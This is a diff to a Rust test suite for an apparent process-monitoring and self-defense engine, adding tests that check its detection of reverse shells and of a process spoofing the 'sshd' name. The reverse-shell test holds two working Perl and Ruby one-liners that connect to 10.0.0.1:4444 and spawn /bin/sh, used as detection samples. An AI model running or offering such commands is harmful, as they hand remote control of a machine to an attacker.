@@ -214,7 +214,14 @@ fn test_kernel_network_blackout_status_query() {
 #[test]
 fn test_kernel_network_blackout_private_storage_and_cleanup() {
     // Verifies that applying and clearing blackout executes safely, uses private storage,
-    // and cleans up temporary rule files immediately without leaving artifacts in /tmp
+    // and cleans up temporary rule files immediately without leaving artifacts in /tmp.
+    //
+    // This really drops all networking when run as root (or pops a pkexec prompt as a
+    // regular user), so it only runs when explicitly requested.
+    if std::env::var("SENTINEL_DESTRUCTIVE_TESTS").as_deref() != Ok("1") {
+        eprintln!("skipping: set SENTINEL_DESTRUCTIVE_TESTS=1 to run the live blackout test");
+        return;
+    }
     let res = sentinel_engine::kernel_apply_network_blackout();
     // In user test mode without root/nft, it returns InterventionResult (ok or err) without panic
     assert!(!res.action.is_empty());
@@ -235,4 +242,45 @@ fn test_self_defense_prctl_and_hash() {
     let hash_res = sentinel_engine::calculate_self_exe_sha256();
     assert!(hash_res.is_ok());
     assert_eq!(hash_res.unwrap().len(), 64);
+}
+
+#[test]
+fn test_evaluate_process_perl_and_ruby_reverse_shells() {
+    let perl = BehaviorAnalyzer::evaluate_process(
+        4242,
+        "perl",
+        Some("/usr/bin/perl"),
+        "perl -e use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){exec(\"/bin/sh -i\");};",
+    );
+    assert!(perl.is_some_and(|a| a.reasons.iter().any(|r| r.contains("reverse-shell"))));
+
+    let ruby = BehaviorAnalyzer::evaluate_process(
+        4243,
+        "ruby",
+        Some("/usr/bin/ruby"),
+        "ruby -rsocket -e f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)",
+    );
+    assert!(ruby.is_some_and(|a| a.reasons.iter().any(|r| r.contains("reverse-shell"))));
+}
+
+#[test]
+fn test_spoofed_immune_name_outside_system_paths_is_not_immune() {
+    // A binary renamed to "sshd" but running from a temp dir must not inherit the
+    // immunity reserved for the real system daemon.
+    let dir = std::env::temp_dir().join(format!("sentinel_immune_test_{}", std::process::id()));
+    let _ = std::fs::remove_dir_all(&dir);
+    std::fs::create_dir_all(&dir).unwrap();
+    let fake = dir.join("sshd");
+    std::fs::copy("/bin/sleep", &fake).unwrap();
+
+    let mut child = std::process::Command::new(&fake).arg("30").spawn().unwrap();
+    let pid = child.id() as i32;
+    std::thread::sleep(std::time::Duration::from_millis(100));
+
+    let res = kernel_terminate_process(pid);
+    let _ = child.kill();
+    let _ = child.wait();
+    let _ = std::fs::remove_dir_all(&dir);
+
+    assert!(res.success, "spoofed process should be terminable: {}", res.message);
 }
